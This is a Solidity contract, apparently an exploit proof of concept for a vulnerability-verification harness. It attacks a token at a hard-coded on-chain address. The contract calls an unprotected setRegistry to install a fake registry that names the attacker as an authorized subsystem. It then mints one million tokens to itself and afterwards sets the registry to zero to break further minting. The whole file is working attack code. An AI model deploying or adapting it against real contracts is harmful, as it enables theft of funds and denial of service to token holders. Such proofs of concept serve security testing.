// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBBToken {
    function setRegistry(address _registry) external;
    function mint(address _user, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract FakeRegistry {
    address internal immutable savings;

    constructor(address authorizedSavings) {
        savings = authorizedSavings;
    }

    function getContractAddress(string memory name) external view returns (address) {
        if (keccak256(bytes(name)) == keccak256(bytes("Savings"))) {
            return savings;
        }
        return address(0);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x3541499cda8CA51B24724Bb8e7Ce569727406E04;
    uint256 internal constant MINT_AMOUNT = 1_000_000 ether;

    address internal immutable fakeRegistry;

    uint256 internal realizedProfit;
    bool internal executed;
    bool public brickConfirmed;

    constructor() {
        fakeRegistry = address(new FakeRegistry(address(this)));
    }

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        IBBToken token = IBBToken(TARGET);
        address attacker = address(this);
        uint256 arbitraryAmount = MINT_AMOUNT;
        uint256 balanceBefore = token.balanceOf(attacker);

        // Exploit path 1 keeps the original causality.
        // getContractAddress("Savings")
        // setRegistry(fakeRegistry)
        // mint(attacker, arbitraryAmount)
        token.setRegistry(fakeRegistry);

        // mint() reaches _isAuthorizedAddress(); and trusts the current registry
        // to supply attacker-controlled subsystem addresses.
        token.mint(attacker, arbitraryAmount);

        realizedProfit = token.balanceOf(attacker) - balanceBefore;

        // Exploit path 2: replace the registry with address(0) to brick future
        // _isAuthorizedAddress() lookups. This is a public on-chain action and
        // preserves the finding's second path without adding any artificial state.
        token.setRegistry(address(0));
        (bool ok,) = TARGET.call(abi.encodeWithSignature("mint(address,uint256)", attacker, 1));
        brickConfirmed = !ok;
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }
}
